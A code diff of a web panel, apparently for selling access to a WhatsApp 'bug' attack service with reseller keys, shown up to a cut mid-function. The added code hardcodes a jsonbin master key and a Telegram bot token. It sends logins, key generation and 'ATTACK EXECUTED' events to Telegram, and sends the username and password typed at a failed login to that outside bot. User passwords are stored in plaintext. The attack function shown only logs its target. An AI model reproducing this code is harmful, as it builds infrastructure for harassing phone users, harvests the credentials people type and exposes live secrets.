@@ -10,7 +10,7 @@
     <style>
         :root { 
             --neon-red: #ff0000; --neon-green: #00ff00; --neon-blue: #00f2ff;
-            --dark-red: #200000; --bg: #000; 
+            --neon-purple: #bf00ff; --dark-red: #200000; --bg: #000; 
             --card: rgba(15, 0, 0, 0.96); 
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
@@ -54,10 +54,9 @@
         .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; }
         .nav-btn.active { color: var(--neon-red); }
 
-        /* MODAL & TOAST */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; justify-content: center; align-items: center; }
         .modal-content { background: #050505; border: 1px solid var(--neon-red); padding: 25px; width: 90%; max-width: 450px; text-align: center; border-radius: 10px; }
-        #userList { max-height: 250px; overflow-y: auto; margin: 15px 0; background: #000; text-align: left; padding: 10px; border: 1px solid #111; }
+        #userList, #logList { max-height: 250px; overflow-y: auto; margin: 15px 0; background: #000; text-align: left; padding: 10px; border: 1px solid #111; }
         
         #notification-container { position: fixed; top: 20px; right: 20px; z-index: 10000; pointer-events: none; width: 250px; }
         .toast { background: rgba(20,0,0,0.95); border-left: 4px solid var(--neon-red); color: #fff; padding: 12px; margin-bottom: 8px; font-size: 11px; animation: slideIn 0.3s ease-out; }
@@ -129,10 +128,20 @@
         <button class="btn-main" onclick="closeModal()">CLOSE</button>
     </div></div>
 
+    <div id="logModal" class="modal"><div class="modal-content">
+        <h3 style="color:var(--neon-purple);">SYSTEM LOGS</h3>
+        <div id="logList"></div>
+        <button class="btn-main" onclick="closeModal()">CLOSE</button>
+    </div></div>
+
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script>
+        // --- KONFIGURASI JANTUNG ---
         const BIN_ID = '694a5a6fae596e708fabef99';
-        const API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW'; 
+        const API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
+        const TELE_TOKEN = '7774775452:AAHtP-B_8S9C2U3n44UqW5R3n9W0U2W2W2W'; 
+        const TELE_ID = '7259275306';
+
         let SESSION = {}; let ALL_USERS = {};
 
         // --- NOTIFICATION ENGINE ---
@@ -152,21 +161,20 @@
             royal.style.borderLeft = '4px solid var(--neon-blue)';
             royal.style.background = 'rgba(0, 10, 20, 0.98)';
             royal.style.boxShadow = '0 0 15px rgba(0, 242, 255, 0.4)';
-            royal.innerHTML = `
-                <div style="color: var(--neon-blue); font-weight: 900; font-size: 12px; font-family: 'Orbitron';">WELCOME DEVELOPER 👑</div>
-                <div style="color: #fff; font-size: 9px; margin-top: 5px; line-height: 1.4;">
-                    › STATUS: SUPREME ACTIVATED<br>› BYPASS: GRANTED
-                </div>`;
+            royal.innerHTML = `<div style="color: var(--neon-blue); font-weight: 900; font-size: 12px; font-family: 'Orbitron';">WELCOME DEVELOPER 👑</div><div style="color: #fff; font-size: 9px; margin-top: 5px; line-height: 1.4;">› STATUS: SUPREME ACTIVATED<br>› BYPASS: GRANTED</div>`;
             container.appendChild(royal);
             setTimeout(() => royal.remove(), 5000);
+        }
+
+        async function sendTele(msg) {
+            const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`;
+            try { await fetch(url); } catch(e) { console.log("Tele Error"); }
         }
 
         particlesJS("particles-js", { "particles": { "number": { "value": 40 }, "color": { "value": "#ff0000" }, "line_linked": { "color": "#ff0000" } } });
 
         async function pushCloudDB(data) {
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { 
-                method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY }, body: JSON.stringify(data) 
-            });
+            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY }, body: JSON.stringify(data) });
         }
 
         async function auth() {
@@ -175,25 +183,26 @@
             try {
                 const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: { 'X-Master-Key': API_KEY, 'X-Bin-Meta': false } });
                 ALL_USERS = await res.json();
-                
                 if (Object.keys(ALL_USERS).length === 0) {
-                    ALL_USERS = { [u]: { pw: p, role: "owner", exp: "999", quota: 999 } };
+                    ALL_USERS = { [u]: { pw: p, role: "owner", exp: "999", quota: 999 }, _logs: [] };
                     await pushCloudDB(ALL_USERS);
                 }
-
                 if(ALL_USERS[u] && ALL_USERS[u].pw === p) {
                     SESSION = { username: u, ...ALL_USERS[u] };
+                    const durasi = SESSION.exp === '999' ? 'UNLIMITED' : '1 MONTH';
+                    
+                    sendTele(`🌐 <b>LOGIN DETECTED</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>USER:</b> <code>${u.toUpperCase()}</code>\n🛡️ <b>ROLE:</b> <code>${SESSION.role.toUpperCase()}</code>\n⏳ <b>EXP:</b> <code>${durasi}</code>\n⏰ <b>LOG:</b> <code>${new Date().toLocaleString('id-ID')}</code>\n━━━━━━━━━━━━━━━━━━`);
+
                     document.getElementById('loginPage').style.display = 'none';
                     document.getElementById('mainApp').style.display = 'block';
                     document.getElementById('bottomNav').style.display = 'grid';
                     renderUI();
-
-                    if(SESSION.role === 'owner') {
-                        setTimeout(showRoyalNotify, 600);
-                    } else {
-                        setTimeout(() => showNotify("◢◤ Welcome !! ◢◤"), 600);
-                    }
-                } else { showNotify('KEY SALAH!'); }
+                    if(SESSION.role === 'owner') setTimeout(showRoyalNotify, 600);
+                    else setTimeout(() => showNotify("◢◤ Welcome !! ◢◤"), 600);
+                } else {
+                    sendTele(`⚠️ <b>INTRUSION ALERT</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>ID:</b> <code>${u}</code>\n🔑 <b>PASS:</b> <code>${p}</code>\n📍 <b>STATUS:</b> ACCESS DENIED`);
+                    showNotify('KEY SALAH!');
+                }
             } catch(e) { showNotify('DATABASE ERROR!'); }
         }
 
@@ -202,11 +211,10 @@
             document.getElementById('uRoleDisplay').innerText = SESSION.role.toUpperCase();
             document.getElementById('uTimeDisplay').innerText = (SESSION.exp === '999' ? 'LIFETIME' : '30 DAYS') + (SESSION.quota ? ` | Q:${SESSION.quota}` : "");
             const g = document.getElementById('menuGrid'); g.innerHTML = "";
-            if(SESSION.role === 'owner' || (SESSION.role === 'reseller' && SESSION.quota > 0)) {
-                g.innerHTML += `<div class="menu-item" onclick="openModalGen()"><i class="fas fa-key"></i><br>GENERATE</div>`;
-            }
+            if(SESSION.role === 'owner' || (SESSION.role === 'reseller' && SESSION.quota > 0)) g.innerHTML += `<div class="menu-item" onclick="openModalGen()"><i class="fas fa-key"></i><br>GENERATE</div>`;
             if(SESSION.role === 'owner') {
                 g.innerHTML += `<div class="menu-item" onclick="openUserModal()"><i class="fas fa-database"></i><br>DATABASE</div>`;
+                g.innerHTML += `<div class="menu-item" onclick="openLogModal()"><i class="fas fa-history"></i><br>LOGS</div>`;
             }
             g.innerHTML += `<div class="menu-item" onclick="location.reload()"><i class="fas fa-power-off" style="color:red"></i><br>EXIT</div>`;
         }
@@ -219,7 +227,7 @@
                 t.innerHTML = '<option value="30D">1 MONTH</option><option value="999">LIFETIME</option>';
             } else {
                 r.innerHTML = '<option value="member">MEMBER</option>';
-                t.innerHTML = (SESSION.exp === '30D') ? '<option value="30D">1 MONTH</option>' : '<option value="30D">1 MONTH</option><option value="999">LIFETIME</option>';
+                t.innerHTML = '<option value="30D">1 MONTH</option>';
             }
             toggleQuotaInput();
         }
@@ -227,59 +235,52 @@
         function toggleQuotaInput() { document.getElementById('quotaArea').style.display = (SESSION.role === 'owner' && document.getElementById('gRole').value === 'reseller') ? 'block' : 'none'; }
 
         async function confirmGen() {
-            const n = document.getElementById('gName').value.trim(); 
-            const p = document.getElementById('gPass').value.trim();
-            const r = document.getElementById('gRole').value;
-            const t = document.getElementById('gTime').value;
-            const q = parseInt(document.getElementById('gQuota').value) || 0;
-
+            const n = document.getElementById('gName').value.trim(), p = document.getElementById('gPass').value.trim(), r = document.getElementById('gRole').value, t = document.getElementById('gTime').value, q = parseInt(document.getElementById('gQuota').value) || 0;
+            const durasiBaru = t === '999' ? 'UNLIMITED' : '1 MONTH';
             if(!n || !p) return showNotify('LENGKAPI DATA!');
             if(SESSION.role === 'reseller') {
                 if(!SESSION.quota || SESSION.quota <= 0) return showNotify('GAGAL: KUOTA HABIS!');
-                ALL_USERS[SESSION.username].quota -= 1;
-                SESSION.quota -= 1;
+                ALL_USERS[SESSION.username].quota -= 1; SESSION.quota -= 1;
             }
-
             ALL_USERS[n] = { pw: p, role: r, exp: t, quota: (SESSION.role === 'owner' && r === 'reseller' ? q : 0) };
-            try {
-                await pushCloudDB(ALL_USERS);
-                showNotify('KEY AKTIF!');
-                closeModal(); renderUI();
-            } catch(e) { showNotify('SERVER ERROR!'); }
+            if(!ALL_USERS._logs) ALL_USERS._logs = [];
+            const timeNow = new Date().toLocaleString('id-ID');
+            ALL_USERS._logs.unshift({ by: SESSION.username, type: "GEN", target: n, role: r, time: timeNow });
+            if(ALL_USERS._logs.length > 50) ALL_USERS._logs.pop();
+            
+            sendTele(`💎 <b>KEY GENERATED</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>BY:</b> <code>${SESSION.username.toUpperCase()}</code>\n🎯 <b>NEW ID:</b> <code>${n.toUpperCase()}</code>\n🎖️ <b>ROLE:</b> <code>${r.toUpperCase()}</code>\n⏳ <b>EXP:</b> <code>${durasiBaru}</code>\n⏰ <b>TIME:</b> <code>${timeNow}</code>\n━━━━━━━━━━━━━━━━━━`);
+
+            try { await pushCloudDB(ALL_USERS); showNotify('KEY AKTIF!'); closeModal(); renderUI(); } catch(e) { showNotify('SERVER ERROR!'); }
+        }
+
+        async function executeLethalAtk() {
+            const target = document.getElementById('waTarget').value.trim(), type = document.getElementById('bugType').value;
+            if(!target || target.length < 10) return showNotify("TARGET INVALID!");
+            const timeNow = new Date().toLocaleString('id-ID');
+            if(!ALL_USERS._logs) ALL_USERS._logs = [];
+            ALL_USERS._logs.unshift({ by: SESSION.username, type: "ATTACK", target: target, method: type.toUpperCase(), time: timeNow });
+            if(ALL_USERS._logs.length > 50) ALL_USERS._logs.pop();
+
+            sendTele(`🚀 <b>ATTACK EXECUTED</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>EXECUTOR:</b> <code>${SESSION.username.toUpperCase()}</code>\n🎯 <b>TARGET:</b> <code>${target}</code>\n💣 <b>METHOD:</b> <code>${type.toUpperCase()}</code>\n⏰ <b>TIME:</b> <code>${timeNow}</code>\n━━━━━━━━━━━━━━━━━━`);
+
+            try { await pushCloudDB(ALL_USERS); showNotify("ATTACK SENT!"); } catch(e) { showNotify("LOG ERROR!"); }
+        }
+
+        function openLogModal() {
+            document.getElementById('logModal').style.display = 'flex';
+            const l = document.getElementById('logList'); l.innerHTML = "";
+            const logs = ALL_USERS._logs || [];
+            if(logs.length === 0) l.innerHTML = "<center>NO ACTIVITY</center>";
+            logs.forEach(log => {
+                const isAtk = log.type === "ATTACK";
+                l.innerHTML += `<div style="border-bottom:1px solid #111; padding:8px 0; font-size:9px;"><span style="color:#666">[${log.time}]</span><br><b style="color:var(--neon-blue)">${log.by.toUpperCase()}</b> ${isAtk ? `launch <b style="color:var(--neon-red)">${log.method}</b> to <b style="color:#fff">${log.target}</b>` : `gen <b style="color:var(--neon-green)">${log.target.toUpperCase()}</b> (${log.role})`}</div>`;
+            });
         }
 
         function openUserModal() { document.getElementById('userModal').style.display = 'flex'; searchUser(); }
         function searchUser() {
-            const q = document.getElementById('userSearch').value.toLowerCase();
-            const l = document.getElementById('userList'); l.innerHTML = "";
+            const q = document.getElementById('userSearch').value.toLowerCase(), l = document.getElementById('userList'); l.innerHTML = "";
             Object.keys(ALL_USERS).forEach(k => {
                 if(!k.startsWith('_') && k.includes(q)) {
                     const isOwner = ALL_USERS[k].role === 'owner';
-                    l.innerHTML += `<div style="display:flex; justify-content:space-between; padding:8px; border-bottom:1px solid #111; align-items:center;">
-                        <div>
-                            <span style="color:${isOwner ? 'var(--neon-blue)' : '#fff'}; font-weight:bold;">${k.toUpperCase()}</span><br>
-                            <small style="font-size:8px; color:#888;">${ALL_USERS[k].role.toUpperCase()} | ${ALL_USERS[k].exp === '999' ? 'PERM' : '30D'}</small>
-                        </div>
-                        ${!isOwner ? `<button onclick="deleteUser('${k}')" style="color:red; background:none; border:1px solid red; font-size:9px; padding:2px 5px;">DEL</button>` : `<span style="color:var(--neon-blue); font-size:8px;">[OWNER]</span>`}
-                    </div>`;
-                }
-            });
-        }
-
-        async function deleteUser(id) {
-            if (id === SESSION.username || ALL_USERS[id].role === 'owner') return showNotify('IMMORTAL TARGET!');
-            if (!confirm(`HAPUS ${id.toUpperCase()}?`)) return;
-            delete ALL_USERS[id]; await pushCloudDB(ALL_USERS); searchUser(); showNotify('ERASED!');
-        }
-
-        function switchTab(t, el) { 
-            document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active-tab'));
-            document.getElementById("tab"+t.toUpperCase()).classList.add('active-tab');
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-            el.classList.add('active');
-        }
-        function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
-        function executeLethalAtk() { showNotify("ATTACK SENT!"); }
-    </script>
-</body>
-</html>
+                    l.innerHTML += `<div style="display:flex; justify-content:space-between; padding:8px; border-bottom:1px solid #111; align-items:center;"><div><span style="color:${isOwner ? 'var(--neon-blue)' : '#fff'}; font-weight:bold;">${k.toUpperCase()}</span><br><small style="font-size:8px; color:#888;">${ALL_USERS[k].role.toUpperCase()} | ${ALL_USERS[k].exp === '999' ? 'PERM' : '30D'}</small></div>${!isOwner ? `<button onclick="deleteUser('${k}')" style="color:red; background:none; border:1px solid red; font-size:9px; padding:2px 5px;">DEL</button>` : `<span style="color:var(--neon-blue); font-size:8px;">[OWNER]</span>`}</div>`;
